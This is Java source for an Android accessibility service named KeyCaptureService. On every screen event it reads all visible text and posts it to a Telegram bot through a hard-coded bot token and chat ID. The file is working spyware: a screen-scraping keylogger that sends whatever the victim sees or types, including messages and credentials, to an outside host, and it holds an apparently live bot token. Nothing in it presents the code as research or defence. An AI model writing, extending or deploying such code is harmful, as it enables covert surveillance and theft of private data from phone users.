package com.example.myeye;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Set;

public class KeyCaptureService extends AccessibilityService {

    private static final String TAG = "KeyCaptureService";
    private static final String BOT_TOKEN = "8114361873:AAFmtl8vD0Vo7CZvkVmwnjcZZxtzvZXqguY";
    private static final String CHAT_ID = "5022620385";
    
    // Prevents spamming duplicate text lines repeatedly
    private String lastSentText = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            if (event == null) return;

            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode != null) {
                StringBuilder screenText = new StringBuilder();
                extractTextRecursive(rootNode, screenText);
                rootNode.recycle();

                String captured = screenText.toString().trim();
                if (!captured.isEmpty() && !captured.equals(lastSentText) && captured.length() > 2) {
                    lastSentText = captured;
                    sendToTelegram(captured);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in accessibility event", e);
        }
    }

    private void extractTextRecursive(AccessibilityNodeInfo node, StringBuilder builder) {
        if (node == null) return;

        if (node.getText() != null) {
            builder.append(node.getText().toString()).append(" ");
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            extractTextRecursive(child, builder);
            if (child != null) {
                child.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {
        Log.d(TAG, "Service interrupted");
    }

    private void sendToTelegram(final String message) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                try {
                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                    URL url = new URL(urlString);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                    conn.setRequestProperty("Accept", "application/json");
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);
                    conn.setDoOutput(true);

                    // Truncate if message is too long for Telegram
                    String safeMessage = message;
                    if (safeMessage.length() > 3500) {
                        safeMessage = safeMessage.substring(0, 3500);
                    }

                    String sanitizedMessage = safeMessage.replace("\"", "\\\"").replace("\n", " ");
                    String jsonInputString = "{\"chat_id\":\"" + CHAT_ID + "\", \"text\":\"" + sanitizedMessage + "\"}";

                    try (OutputStream os = conn.getOutputStream()) {
                        byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }

                    conn.getResponseCode();
                } catch (Exception e) {
                    Log.e(TAG, "Telegram send error", e);
                } finally {
                    if (conn != null) {
                        conn.disconnect();
                    }
                }
            }
        }).start();
    }
}
